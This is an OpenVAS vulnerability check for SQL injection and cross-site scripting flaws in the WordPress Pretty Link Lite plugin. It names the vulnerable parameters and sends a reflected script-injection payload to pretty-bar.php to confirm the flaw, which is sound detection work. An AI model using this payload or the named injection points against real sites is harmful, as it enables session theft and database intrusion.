###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_pretty_link_plugin_mult_vuln.nasl 3058 2016-04-14 10:45:44Z benallard $
#
# WordPress Pretty Link Lite Plugin SQL Injection And XSS Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to cause SQL Injection
  attack and gain sensitive information or insert arbitrary HTML and script
  code, which will be executed in a user's browser session in the context of
  an affected site.
  Impact Level: Application";
tag_affected = "WordPress Pretty Link Lite Plugin version 1.5.2 and prior";
tag_insight = "The flaws are due to improper validation of user-supplied input to,
  - 'url' parameter to pretty-bar.php script and 'k' parameter to
    rli-bookmarklet.php script.
  - 'page' parameter to '/wp-admin/admin.php', which allows attacker to
    manipulate SQL queries by injecting arbitrary SQL code.";
tag_solution = "Upgrade to Pretty Link Lite Plugin version 1.5.4 or later,
  For updates refer to http://wordpress.org/extend/plugins/pretty-link/";
tag_summary = "This host is running WordPress with Pretty Link Lite plugin and is
  prone to sql injection and cross site scripting vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802857";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 3058 $");
  script_bugtraq_id(53531);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-04-14 12:45:44 +0200 (Thu, 14 Apr 2016) $");
  script_tag(name:"creation_date", value:"2012-05-17 11:13:01 +0530 (Thu, 17 May 2012)");
  script_name("WordPress Pretty Link Lite Plugin SQL Injection And XSS Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47121");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/75630");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/47121");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/112693/wpprettylinklite-sqlxss.txt");

  script_summary("Check if WordPress Pretty Link Lite  Plugin is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Variable Initialization
dir = "";
url = "";
port = 0;

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);


## Construct the Attack Request
url = dir + '/wp-content/plugins/pretty-link/pretty-bar.php?' +
            'url="><script>alert(document.cookie)</script>';

## Try attack and check the response to confirm vulnerability.
if(http_vuln_check(port:port, url:url, check_header:TRUE,
       pattern:"<script>alert\(document.cookie\)</script>",
       extra_check: make_list("Pretty Link","WordPress"))){
  security_message(port);
}
